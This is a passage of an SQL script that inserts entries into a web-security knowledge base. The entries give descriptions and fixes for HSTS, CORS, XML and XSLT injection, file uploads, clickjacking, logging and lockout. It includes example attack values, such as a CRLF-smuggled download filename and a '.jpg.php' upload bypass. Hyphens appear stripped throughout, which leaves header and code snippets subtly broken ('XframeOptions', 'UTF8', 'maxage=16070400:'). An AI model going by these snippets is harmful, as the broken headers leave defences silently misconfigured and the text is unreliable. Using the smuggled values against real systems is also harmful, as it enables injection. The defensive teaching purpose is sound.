The solution to base jumping would be to use absolute paths in your application such as  action=''/update_profile.php''
instead of: action=''update_profile.php''

5/6 can both also easily be prevented simply be encoding or sanitizing your userinput submitted towards your application.
Always validate your user input on a high level(serverside constraint). Whenever your application expects an integer you should validate and check whether the user submitted input really is what you expected it to be and otherwise, you terminate and log the request.

', 'HTML injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('53',' Description:

Whenever session information is not stored on the serverside an attacker could easily tamper
and manipulate these values. This is always a bad idea and you should not do this!

 Solution:

Session information should always be stored  on the serverside by means of a serverside language.
', 'Session information is not stored server side'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('25',' Description:

HTTP StrictTransportSecurity (HSTS) enforces secure (HTTP over SSL/TLS) connections to
the server. This reduces the impact of bugs in web applications leaking session data through
cookies and external links and defends against Maninthemiddle attacks. HSTS also
disables the ability for user''s to ignore SSL negotiation warnings

 Solution:

These headers are also known as the: StrictTransportSecurity: maxage=16070400:
includeSubDomains and provide protection against SSL Strip attacks when implemented in the
application or web server.

When connecting to an HSTS host for the first time, the browser won''t know whether or not
to use a secure connection, because it has never received an HSTS header from that host.
Consequently, an active network attacker could prevent the browser from ever connecting
securely (and even worse, the user may never realize something is amiss). To mitigate
this attack, you can add your application to a preload list which makes HSTS enforced by default.
When a user connects to one of these hosts for the first time, the browser will know that
it must use a secure connection. If a network attacker prevents secure connections to the
server, the browser will not attempt to connect over an insecure protocol, thus
maintaining the user''s security.

Visit:
    https://hstspreload.appspot.com/
Here you can find how to add your application to HSTS preload
', 'Include Strict Transport Security header'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('204',' Description:

It always can happen that you need the keys or the passwords of the application or in components
that are needed by the application to work in a secure state. When these keys needs to be revoked
because the password was leaked or an administrator leaving the company it''s always smart to have
the possibility to revoke the keys or passwords without too much problems.

 Solution:

Verify in the application and components it uses that it''s possible to replace the used keys and
passwords. Also replace default keys and passwords after the installation of the application.
', 'Keys and passwords should be replaceable'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('226',' Description:

whenever files from untrusted services are uploaded to the server, there should be additional checks
in place to verify whether these files contain viruses (malware, trojans, ransomware). 

 Solution:

After uploading the file, the file should be placed in quarantine and antivirus has to 
inspect the file for malicious viruses. Antivirus software that has a commandline interface is 
requisite for doing such scans. There are also API''s available for other services such as
from "VirusTotal.com" 

This site provides a free service in which your file is given as input to 
numerous antivirus products and you receive back a detailed report with the evidence resulting from 
the scanning process
', 'File upload anti virus check'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('234',' Description:

Whenever structured data is strongly typed and validated against a defined schema the application
can be developed as a defensible proactive application. The application can now measure everything
that is outside of its intending operation by means of the defined schema''s and should be used to
reject the input if the schema checks return false.


 Solution:

Verify that structured data is strongly typed and validated against a defined schema
including allowed characters, length and pattern (e.g. credit card numbers or telephone, 
or validating that two related fields are reasonable, such as validating suburbs and zip or 
post codes match
', 'Verify that structured data is strongly typed and validated'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('153',' Description:

Whenever you are implementing a forgot password function into your system there are
a few things you need to take into consideration in order to prevent security flaws
in your application.

1. Forget password functions
2. Denial of service by locking out accounts
3. Username enumeration
4. Does The application enforce the use of secure passwords
5. Disallow the use of old passwords

 Solution:

The first thing is verify the password has been forgotten and other recovery paths send a link including a timelimited activation token rather than the password itself.
Additional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over.
Second, you should not lock out the user’s account whilst the process of getting a new password is in progress. This could lead to a Denial of service attack whenever an attacker decides to intentionally lock out the users with an automated attack.
Third, whenever the new password request was set in progress, the message you display should be generalized in order to prevent username enumeration.
Fourth, always disallow the use of old passwords and implement a strong password policy.

', 'Password forget pattern'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('112',' Description:

Cross Origin Resource Sharing or CORS is a mechanism that enables a web browser to perform
''crossdomain'' requests using the XMLHttpRequest L2 API in a controlled manner.
In the past, the XMLHttpRequest L1 API only allowed requests to be sent within the same
origin as it was restricted by the same origin policy.

 Solution:

CrossOrigin requests have an Origin header, that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use a web browser and a server to determine whether a crossorigin request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this process, that are supported by all major browsers:

 Origin
 AccessControlRequestMethod
 AccessControlRequestHeaders
 AccessControlAllowOrigin
 AccessControlAllowCredentials
 AccessControlAllowMethods
 AccessControlAllowHeaders

Things you must consider when using CORS

1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to be
cross domain; this behavior can lead to code injection by a remote attacker. Pay extra
attention to absolute URLs.

2. Ensure that URLs responding with AccessControlAllowOrigin: * do not include any
sensitive content or information that might aid an attacker in further attacks.
Use the AccessControlAllowOrigin header only on chosen URLs that need to be
accessed crossdomain. Don''t use the header for the whole domain.

3. Allow only selected, trusted domains in the AccessControlAllowOrigin header.
Prefer whitelisting domains over blacklisting or allowing any domain
(do not use * wildcard nor blindly return the Origin header content without any checks)

4. Keep in mind that CORS does not prevent the requested data from going to an
unauthenticated location. It''s still important for the server to perform usual
CSRF prevention.

5. While the RFC recommends a preflight request with the OPTIONS verb, current
implementations might not perform this request, so it''s important that "ordinary"
(GET and POST) requests perform any access control necessary.

6. Discard requests received over plain HTTP with HTTPS origins to prevent mixed
content bugs.

7. Don''t rely only on the Origin header for Access Control checks. Browser always sends
this header in CORS requests, but may be spoofed outside the browser.
Applicationlevel protocols should be used to protect sensitive data.

**NOTE:** 
Modern application frameworks do dynamically allocation of the origin header, resulting in the browser
also allowing to send the "AccessControlAllowCredentials: true" header as well in requests. 
Whenever JSON web tokens are being send in cookies rather than headers, potential attackers could abuse this behaviour to 
make unauthenticated XHR get requests on the authenticated users behalf to read sensitive information from the 
pages.
', 'Cross origin resource sharing'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('9',' Description:

A vulnerability occurs when an XSL file is loaded from a source controlled by an attacker.
When the attacker is given the opportunity to specify the source of the included XSL file
he could include a file which contains malicious code to be parsed on the target application.
This could lead to, code execution, reading arbitrary files and many more
vulnerabilities such as XSS.

 Solution:

To protect against such vulnerability one needs to make sure that he does not use
usersupplied input in the XSL filename.
The best solution would be to define a list of permitted filenames and
only accept XSL filenames from that list.
', 'XSLT injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('231',' Description:

Whenever the users username and passwords are disclosed by an application on what ever fashion possible, the 
users account should still be proteced by two factor authentication mechanisms to prevent attackers
from logging in with the credentials.


 Solution:

Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism – typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)

Examples of two/multi factor authentication can be 

1. Google authenticator
   Google Authenticator is an application that implements twostep verification services using the Timebased 
   Onetime Password Algorithm (TOTP) and HMACbased Onetime Password Algorithm 

2. Yubikey

  The YubiKey is a hardware authentication device manufactured by Yubico that supports onetime passwords, public key   
  encryption and authentication, and the Universal 2nd Factor (U2F) protocol[1] developed by the FIDO Alliance (FIDO U2F).
  It allows users to securely log into their accounts by emitting onetime passwords or using a FIDObased public/private
  key pair generated by the device
', 'two factor authentication against username password disclosure'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('135',' Description:

Whenever sensitive data is rapidly removed from the systems’ memory, this decreases the possibility the attacker has to compromise this data by means of memory dumping attacks.

 Solution:

Verify that sensitive data is rapidly sanitized from memory as soon as it is no longer needed and handled in accordance with functions and techniques supported by the framework/library/operating system.
', 'sanitise sensitive data rapidly from memory'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('61',' Description:

Whenever directory listing is enabled, an attacker could gain sensitive information about
the systems hierarchical structure and gain knowledge about directories or files which should
possibly not be publicly accessible. An attacker could use this information to
increase his attack vector. In some cases this could even lead to an attacker gaining knowledge about
credentials or old vulnerable system demo functions which might lead to remote code execution.

 Solution:

Different types of servers require a different type of approach in order to disable
directory listing. For instance: Apache uses a .htacces in order to disable directory listing.
As for iis7, directory listing is disabled by default.
', 'Directory listing'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('183',' Description:

Whenever you are using XML in your application there are a few possibilities for
injections depending on how you are applying XML in your system.

Extensible Markup Language (XML) is a markup language that defines a set of rules for
encoding documents in a format which is both humanreadable and machinereadable. It is
defined by the W3C''s XML 1.0 Specification and by several other related specifications,
all of which are free open standards.

 Solution:

Items listed below are recommended to read whenever you are planning to use XML in your
application.

Recommended knowledge base items:

 XML injection
 External DTD parsing
 XSLT injections
 XPath injections
 XXE injections
', 'XML attacks'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('260',' Description: 

All third party components the application depends on to operate must be mapped in
terms of the functions, and/or security functions, they provide for several reasons.

1. Whenever one of these dependencies is down the application has to handle the missing of
   that dependency gracefully and not break down resulting in a DOS.

2. All security functions they provide must be mapped and backed up by a WAF or ModSecurity in case
   the dependency goes down for service.

 Solution:

Verify that all components that are not part of the application but that the application
relies on to operate are defined in terms of the functions, and/or security functions, they provide.
', 'Third party components'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('98',' Description:

Logging should always be implemented on the serverside since an attacker otherwise 
manipulates the functionality and erases his traces.

 Solution:

Verify that all logging controls are implemented on the serverside.
', 'Logging implemented on the serverside'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('35',' Description:

When user input is used to evaluate scripting code, highsecurity risks could be introduced. If the input is not properly escaped an attacker can inject his own script code and gain access to the server.

 Solution:

Do not use direct userinput in the dynamic scripting function. You should first
use an input validation or encoding function on the user submitted data to clean and
sanitize the input against malicious intent.
', 'Dynamic scripting injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('75',' Description:

The information that is stored of the application and/or user
activities needs to be documented, this will make it transparent where sensitive
information is stored and why.

 Solution:

Create a section in the documentation of the project that defines the information
that will be stored. This makes it easier to make estimations about critical parts
of your application which deserve extra attention.
', 'The possible risks to the application must be documented'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('37',' Description:

A hacker must not gain the ability to abuse an applications email functionality by
means of scripts which sends automated spamming mails.

 Solution:

This problem could be prevented by implementing CAPTCHA or ratelimiting mechanisms.
', 'Automated spamming via feedback scripts'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('174',' Description:

Whenever your application contains administration and management functions you should
put on restrictions for visiting these functionalities in order to reduce an attackers
attack vector on your services since they are not directly accessible for them.

 Solution:

Verify that access to administration and management functions within the Web Service
Application is limited to web service administrators.

For example, they could only be accessible from within a restricted source IP range.
', 'Access management'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('177',' Description:

Whenever you are parsing data exchange formats such as XML, JSON, CSV, etc, you
have to make sure that whenever these data files contain malicious code this will not be
executed by your application. You should also not solely depend on your parser to do all
the encoding and escaping for you since there could always be an edge case that does
execute certain attacks.

 Solution:

We highly recommend doing your own escaping, sanitizing, encoding on all data before entering your application. The risk also depends on the context of wherever you are putting this data into. So before you are doing any mutations with your data after getting it from the resources, make sure you have applied the right mitigations.

Also, another reason to build an extra layer of escaping, sanitizing, encoding routines in your application is for the logging you want to apply on the data.


Recommended knowledge base items:

 Input rejection
 Input validation
 Audit logs
', 'Parsing data  exchange formats'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('176',' Description:

Whenever there is userinput supplied into your application you also want to limit
the size of the userinput to appropriate maximum lengths.

 Solution:

Verify all the user input has been limited and the application only accepts expected input 
lengths
', 'Limiting user input size'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('26',' Description:

Sensitive data should not be stored in a cookie,because the cookie is also used on the clientside and is adaptable thus making
its content readable. A hacker could gain access to a cookie through cross site scripting
attacks and gain the sensitive information stored
in the targets cookie.

 Solution:

Do not store sensitive information in cookies.
', 'sensitive information stored in cookies'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('8',' Description:

XML Injection is an attack technique used to manipulate or compromise the logic of an XML
application or service. The injection of unintended XML content and/or structures into
an XML message can alter the intended logic of the application. Further, XML injection
can cause the insertion of malicious content into the resulting message/document.

 Solution:

In addition to the existing input validation, define a positive approach which
escapes/encodes characters that can be interpreted as XML. At a minimum this includes
the following: < > / " ''
', 'XML injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('210',' Description:

All time sources must be synchronized throughout. For example, different API servers or 
microservices. to prevent logs to be tainted and become unusable for forensics.

 Solution:

Time sources should be synchronized to ensure logs have the correct time. If these
time sources are not synchronized, the logs lose integrity and can become untrusted for
investigators.
', 'All time sources should be synchronized'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('168',' Description:

Pinning is the process of associating a host with their expected X509 certificate or
public key. Once a certificate or public key is known or seen for a host, the certificate
or public key is associated or ''pinned'' to the host. If more than one certificate or
public key is acceptable, then the program holds a pinset
(taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertised
identity must match one of the elements in the pinset.

 Solution:

The idea is to reuse the existing protocols and infrastructure, but use them in a
hardened manner. For reuse, a program would keep doing the things it used to do when
establishing a secure connection.

To harden the channel, the program would take advantage of the OnConnect callback offered
by a library, framework or platform. In the callback, the program would verify the
remote host''s identity by validating its certificate or public key. While pinning does
not have to occur in an OnConnect callback, it is often most convenient because the
underlying connection information is readily available.

For more extended information on different types of implementation please see:
https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning
', 'TLS certificate public key pinning'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('66',' Description:

This is a form of security by obscurity. Whenever an attacker manages to fuzz or spider
this URL the application could compromise whatever is behind this URL.

 Solution:

Always implement proper authentication mechanisms that are not using a static authentication URL.
', 'Authentication based on the knowledge of a secret URL'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('236',' Description:

Log injection problems are a subset of injection problem, in which invalid entries taken
from user input are inserted in logs or audit trails, allowing an attacker to mislead
administrators or cover traces of an attack. Log injection can also sometimes be used to
attack log monitoring systems indirectly by injecting data that monitoring systems will
misinterpret.


 Solution:

You should consider these three controls when implementing logging systems.

 Design: If at all possible, avoid logging data that came from external inputs.

 Implementation: Ensure that all log entries are statically created, or if they must
  record external data that the input is vigorously whitelist checked.

 Run time: Avoid viewing logs with tools that may interpret control characters in the
  file, such as commandline shells.

Also verify that all nonprintable symbols and field separators are properly encoded in log entries,
to prevent log injection.
', 'Log injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('99',' Description:

The logging should contain some guidelines in order to organize your logging file in such
a way it  would allow for a detailed investigation of the timeline when an event happens.

 Solution:

The logging file should at least contain, a timestamp from a reliable source, severity
level of the event, an indication that this is a security relevant event
(if mixed with other logs), the identity of the user that caused the event
(if there is a user associated with the event), the source IP address of the request
associated with the event, whether the event succeeded or failed, and a
description of the event. Also verify that log fields from trusted and untrusted sources
are distinguishable in log entries, preferably stored in different files so they cannot
taint each other whenever log injection occurs.

Verify accessing sensitive data is logged, if the data is collected under relevant data protection
directives or where logging of accesses is required.
', 'Logging guidelines'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('160',' Description:

Reflective file download occurs whenever an attacker can "forge" a download through misconfiguration in your "disposition" and "content type" headers. Instead of having the attacker to upload an evil file to the web server he can now force the browser to download a malicious file by abusing these headers and setting the file extension to any type he wants.

Now, whenever there is also userinput being reflected back into that download it can be used to forge evil attacks. The attacker can present an evil file to ignorant victim''s who are trusting the domain of which the download was presented from.

File download injection is a similar type of attack except this attack is made possible whenever there is userinput that is reflected into the "filename=" parameter in the "disposition" header. The attacker again can force the browser to download a file with his own choice of extension and set the content of this file by injecting this directly into the response like filename=evil.bat%0A%0D%0A%0DinsertEvilStringHere

Whenever the user now opens the downloaded file the attacker can gain full control over the target’s device.


 Solution:

First, never use user input directly into your headers since an attacker can now take control over it.

Secondly, you should check if a filename really does exist before presenting it towards the users. You could also create a whitelist of all files which are allowed to be downloaded and terminate requests whenever they do not match.

Also, you should disable the use of "path parameters". It increases the attacker’s attack vector and these parameters also cause a lot of other vulnerabilities.
And last you should sanitize and encode all your userinput as much as possible. Reflective file downloads depend on userinput being reflected in the response header. Whenever this input has been sanitized and encoded it should not do any harm to any system it is being executed on

', 'RFD and file download injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('218',' Description:

An attacker can use debug tooling to find out how the application is working and determain the 
possible attack surface by using tooling like GDB or running the application in an emulator. Using
these type of tooling the attacker can learn a lot about the tool and succesfully attack the application
and have a higher change of succeeding.

 Solution:

The application has to make use of antidebugging techniques that are sufficient enough to deter or 
delay likely attackers from injecting debuggers into the application. Also the application has to be
able to notice if it''s runned on an emulator or a specially designed hardware device that was not 
intended to be used and to prevent the attacker from gaining knowledge about the application.
', 'Enforce anti'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('125',' Description:

Verify the system can protect against aggregation or continuous access to functions,  
resources, or data. For example, possibly by the use of a resource governor to limit the
number of edits per minute in order to to prevent an automatic attack

 Solution:

Verify the application has the ability to detect and alert on abnormal numbers of requests
for information or processing highvalue transactions for that user role, automated use of web service extraction, or data loss prevention. For example, the average user should not be able to access more than 5 records per hour or 30 records
per day or add 10 friends to a social network per minute.
', 'Aggregate user requests'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('34',' Description:

A resource identifier injection basically means that the attacker can determine which
resources are loaded into the web application.
An attacker could thus influence the operation of the web application and redirect users
to other websites. This attack consists of changing resource identifiers used by an
application in order to perform a malicious task. When an application permits a user
input to define a resource, like a file name or port number,
this data can be manipulated to execute or access different resources.
In order to be properly executed, the attacker must have the possibility to specify a
resource identifier through the application form and the application must permit the execution.
The resource type affected by user input indicates the content type that may be exposed.
For example, an application that permits input of special characters like period, slash,
and backlash is risky when used in methods that interact with the file system.
The resource injection attack focuses on accessing other resources than the local
filesystem, which is different attack technique known as a Path Manipulation attack.

 Solution:

Safe use of resource identifiers can be done by performing authorisation checks if the
identifier belongs to the user.
', 'Resource identifier injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('68',' Description:

When the browser has to guess the charset according to the content that is presented by
the application, then this could lead to XSS injections when the guess is wrong.

 Solution:

Define the charset for all your pages in order to prevent the browser for guessing
the content types.

This could be done by adding a meta header in the head of your HTML like:

For HTML4:
```html
<meta httpequiv="ContentType" content="text/html;charset=ISO88591">
```
For HTML5:
```html
<meta charset="UTF8">
```
Or simply by setting contenttype headers by your serverside language,
C example of a content type header:
Response.AppendHeader("ContentType:text/html", "charset=UTF8");
', 'Incorrect or missing charset'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('28',' Description:

The error messages that are displayed when a user fails to login into an application
should be selected with caution. When this error message gives away too much information,
this information can be exploited by a hacker.

 Solution:

The application should never publish available usernames. When an attacker gains this
information he increases his attack vector and reduces the time
required to identify accounts.

I.e:

Imagine a forgot password function where the user enters his username in order for the
application to send a new password to his email address, the user enters a correct username
and the application responds with:

“Email successfully sent to your email address.” When the user enters an incorrect username it says,  “Error: user does not exist.”

This function would be vulnerable to username enumeration
', 'Too verbose authentication'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('67',' Description:

Unvalidated redirects and forwards are possible when a web application accepts untrusted
input that could cause the web application to redirect the request to a URL contained
within the untrusted input. By modifying untrusted URL input to a malicious site, an attacker
may successfully launch a phishing scam and steal user credentials. Because the server
name in the modified link is identical to the original site, phishing attempts may have
a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used
to maliciously craft a URL that would pass the application''s access control check and
then forward the attacker to privileged functions that they would normally not be able
to access.

 Solution:

Use a whitelisting method for determining where the user should be redirected towards.
You could also show a warning when redirecting to potentially untrusted content.

If not deemed necessary user supplied input should not be used in redirects and forwards anyways.
', 'Open forward and Open redirects'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('245',' Description:

Whenever the application does not put a threshold on the number requests made to the server,
screen scraping and data harvesting tools can gather data and information.

i.e should the application contain an insecure direct object reference, then the data harvesting
tool could now harvest information it was not originally authorized to access to.

Or the application is a web shop and the competition is scraping prices and products in order to 
give them an edge on comparison websites and get more business.

 Solution:

ModSecurity can be used to set up rules to prevent attackers from scraping and harvesting data
from the application. The ModSecurity can be set up with thresholds and rate limiting and block
IP adresses if they exceed the threshold.
', 'Screen scraping data harvest'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('167',' Description:

There are two popular methods for handling input validation. The first is blacklisting and the second one is the whitelisting method, also known as a positive validation model.
The big disadvantage of the blacklisting model would be that an attacker has a great diversity into forging his attack strings and payloads which can make it hard for your application to detect all of them. It would be very time consuming importing them all into your system.
Whenever you are using a positive validation model you are simply checking for the input you were expecting as defined in your application’s operation, for example:

Let''s say you have a form and were expecting it to return the value of a checkbox. This would be a fixed value, yes or no? Whenever the value diverges from the expected input in the applications operation you can assume there was an intercepting proxy tampering these values and act accordingly to it. 
Same goes for whenever you were expecting just a string, integer, alphanumeric character or even special strings such as names as O’Reily.
This method also makes your code clear, transparent and highly maintainable.

 Solution:

First there must be a client side input validation method as you would apply to the server
side. This means you should also apply input rejection as well as typecasting and such.
This is to prevent users from being attacked by XSS attacks which are undetectable by
the server.

', 'Positive validation model'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('20',' Description:

Clickjacking, also known as a "UI redress attack", is when an attacker uses multiple
transparent or opaque layers to trick a user into clicking on a button or link on another
page when they were intending to click on the top level page. Thus, the attacker is
"hijacking" clicks meant for their page and routing them to another page, most likely
owned by another application, domain, or both.

Using a similar technique, keystrokes can also be hijacked. With a carefully crafted
combination of stylesheets, iframes, and text boxes, a user can be led to believe they
are typing in the password to their email or bank account, but are instead typing into an
invisible frame controlled by the attacker.

 Solution:

To avoid your application from being clickjacked you can add the XframeOptions header
to your application. These headers can be configured as:

    XframeOptions: deny

The page cannot be displayed in a frame, regardless of the site attempting to do so.

    XFrameOptions: sameorign  

The page can only be displayed in a frame on the same origin as the page itself.

    XFrameOptions: ALLOWFROM uri

The page can only be displayed in a frame on the specified origin.

You may also want to consider to include "Framebreaking/Framebusting" defense for legacy
browsers that do not support XFrameOption headers.

Source:
https://www.codemagi.com/blog/post/194
', 'Include anti clickjacking headers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('76',' Description:

Authentication decisions should be logged along with relevant metadata for security 
investigations. This information could for example, be used whenever there is suspicion about
accounts being compromised. Also, passwords and other sensitive information should never be stored
in these log files. Whenever an attacker gains knowledge of these files, this information
could be used to compromise other accounts. 

Note: "Usernames should also never be stored in the log files, users are not always paying
attention to their actions and sometimes provide the username form field with their password.
If the application would log the usernames, these passwords are now also stored and can be
used to compromise accounts whenever an attacker gains knowledge of these files.

 Solution:

Verify that all authentication decisions can be logged, without storing sensitive session 
identifiers or passwords. This should include requests with relevant metadata
needed for security investigations.
', 'Possible attackers of the application must be documented'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('139',' Description:

Whenever your certificate authority is not trusted anymore you should always be able to
recall these certificates ASAP to prevent man in the middle attacks on your applications users.

 Solution:

The trust anchor for given zone is found in the keyset<zone name> file on the secure
signing computer in the same location where the signed and unsigned copies of the zone reside.
This file is created automatically as part of the signing process.
A certificate revocation list (CRL) is a list, created and signed by a
certificate authority (CA), which contains serial numbers of certificates that have been
issued by that CA and are currently revoked. In addition to the serial number of the
revoked certifications, the CRL also contains the reason for revocation for each certificate
and the time the certificate was revoked. The serial number for each revoked certificate is
kept in the CAs database and published in the CRL until the certificate expires.

After the revoked certificate is expired, the certificates entry in the CRL is removed and
the CA may remove the certificate from its database. Typically, the revoked certificate
will remain in the CRL for one publication period after the certificate expires. By all
times you should have this information in reach in order to take quick actions.
', 'Certificate paths revocation information'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('100',' Description:

Whenever user supplied input is being handled into log viewing software, this software can be manipulated by potential attackers whenever this input is not properly being sanitized before outputting in the software. Depending on the context of where the supplied input is being used this could lead to an entire subset of attacks.

 Solution:

You should consider these three controls when supplying information to the log viewing software:
    •	Design: If at all possible, avoid logging data that came from external inputs.
    •	Implementation: Ensure that all log entries are statically created, or if they must record external data that the input       is vigorously whitelist checked.  
    •	Run time: Avoid viewing logs with tools that may interpret control characters in the file, such as commandline shells.

Also verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection.
', 'Log viewing software code injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('13',' Description:

Uploaded files represent a significant risk to applications.
The first step in many attacks is to get some code to the system to be attacked.
Then the attack only needs to find a way to get the code executed. Using a file upload
helps the attacker accomplish the first step.

The consequences of unrestricted file upload can vary, including complete system takeover,
an overloaded file system or database, forwarding attacks to backend systems, and simple
defacement.

There are really two classes of problems here.
The first is with the file metadata, like the path and file name.
These are generally provided by the transport, such as HTTP multipart encoding.
This data may trick the application into overwriting a critical file or storing the file
in a bad location. You must validate the metadata extremely carefully before using it.

The other class of problem is with the file size or content.
An attacker can easily craft a valid image file with PHP code inside.

 Solution:

Uploaded files always need to be placed outside the document root of the webserver.

You should also check the userinput(filename) for having the right
allowed extensions such as .jpg, .png etc.

Note: when checking these extensions always make sure your application validates the last
possible extension so an attacker could not simply inject ".jpg.php" and bypass your
validation

After this validation, you must also check the userinput(filename) for containing possible
path traversal patterns in order to prevent him from uploading outside of
the intended directory.

Most developers also do a mimetype check. This is a good protection however not
whenever you are checking this mimetype through the post request. This header can not be
trusted since it can be easily manipulated by an attacker.

The best way to check the mimetype
is to extract the file from the server after uploading and check it from the file itself.
Deleting it whenever it does not comply with expected values.

You may also want to check if the filenames do already exist before uploading in order to
prevent the overwriting of files.

Also for serving the files back there needs to be a file handler function that can select
the file based on an identifier that will serve the file back towards the user.
', 'File upload injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('16',' Description:

Sometimes it is possible through an "enabling debug parameter" to display technical
information within the application. As a result, the attacker learns more about the
operation of the application, increasing his attack vector.

 Solution:

Disable the possibility to enable debug information on a live environment.
', 'Debug enabeling'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('185',' Description:

The application should separate data, controller, and display layers in order to make your
application more clear and understandable in terms of abstraction due to separation.

Whenever your application is more organized and abstracted it is much easier to implement
less flawed security controls.

 Solution:

Make sure your different type of data layers are separated in your application.

The separation of these different layers is also know as a design pattern which goes
by the name MVC (model, view, controller).
', 'data controller display layer separation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('182',' Description:

All applications should contain the possibility to lock down accounts for whenever it
detects attacks by/on users. Also you should include options for both soft and hard
lockout mechanisms.

 Solution:

Soft lockout:
This can be a good option for protecting your users against brute force attacks.
For example, whenever the user enters a wrong password three times, the application could
lock down the account for a minute in order to slow down the process of brute forcing his
password making it less profitable for the attacker to proceed. If u were to implement
hard lockout countermeasures for this example you would achieve a "Dos" by permanently
locking out accounts.

Hard lockout:
This type of lockout should be applied whenever you detect a user attacking your
application and counter him by means of permanently locking out his account until a
response team had time to do their forensics. After this process you can decide to
give the user back his account or take further legal actions against him.
This type of approach prevents the attacker from further penetrating your application
and infrastructure.

Note: 
Be cautious that a softlockout countermeasure does not override a hardlockout status.


', 'Account lockout'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('203',' Description:

Attackers are always on the lookout for secrets of a server or computer. When these secrets are
accessible for an attacker because the key was not properly being destroyed then this can lead to
security vulnerabilities. All secrets and keys should be completely erased from the memory since 
an attacker could otherwise potentially retrieve these keys with memory dumping attacks on the application.

 Solution:

Secrets and keys should be erased from the memory and zeroed when they are no longer needed to prevent attackers from 
doing memory dumping attacks.

Also take into consideration the different Garbage collectors of your programming language. Whenever you zero out the keys of secret in question, you have no guarantee that a copy of it doesn''t exist elsewhere in memory.
', 'Zero keys and secrets before destroying them'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('126',' Description:

The principle of least privilege recommends that accounts have the least amount of
privilege required to perform their business processes. This encompasses user rights,
resource permissions such as CPU limits, memory, network, and file system permissions.

 Solution:

The principle means giving a user account only those privileges which are essential to
that user’s work. For example, a backup user does not need to install software: hence,
the backup user has rights only to run backup and backuprelated applications.
Any other privileges, such as installing new software, are blocked.

The principle applies also to a personal computer user who usually does work in a normal
user account, and opens a privileged, password protected account (that is, a superuser)
only when the situation absolutely demands it.

This principle can also be applied to your webapplications. Instead of solely depending
on role based authentication methods using sessions, we rather want to assign privileges
to users by means of a DatabaseBased Authentication system.

We still use sessions in order to identify if the user was logged in correctly, only now
instead of assigning that user with a specific role we assign him with privileges to
verify which actions he is privileged to perform on the system.

Also, a big pro of this method is, whenever a user has to be assigned fewer privileges
your changes will be applied on the fly since the assigning does not depend on the session
which otherwise had to expire first.
', 'Principle of least privilege'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('248',' Description:

For all the data gathered in an application, there should be set up a data retention policy
to make sure all the data is removed from the application when it is no longer used. This reduces
the damage done by potential attackers when they get access to the applications data due to a breach.

 Solution:

All the sensitive information within the application must be mapped along with the 
timeframe it is necessary to store this data on the application. For each data set it
must be determined how to effectively clear this information from the application.

', 'Data retention policy'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('17',' Description:

Each site uses a robots.txt file which allows search engines to provide information.
The robots.txt determines what pages may or may not be indexed by google or yahoo etc.
However, a common mistake made by programmers is applying a blacklisting method causing
the application displaying sensitive information to attackers.

 Solution:

Instead of the blacklisting method:

Useragent: *
Disallow: /squirrelmail/
